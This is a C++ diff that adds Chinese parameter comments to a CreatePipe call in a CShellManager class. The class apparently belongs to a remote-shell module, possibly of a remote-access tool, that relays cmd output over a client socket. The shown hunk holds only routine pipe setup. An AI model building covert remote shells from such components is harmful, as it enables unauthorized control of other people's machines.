@@ -26,7 +26,12 @@ CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
 
 
 	//创建管道，管道用于获取cmd的数据信息
-    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
+    if(!CreatePipe(
+		&m_hReadPipeHandle,	// __out 读取句柄
+		&m_hWritePipeShell,	// __out 写入句柄
+		&sa,				// __in SECURITY_ATTRIBUTES结构体指针 加测返回的句柄是否能够被子进程继承，为NULL不能继承 匿名管道必须有这个结构体
+		0					// 缓冲区大小，参数为0时使用默认大小
+	))
 	{
 		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
 		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
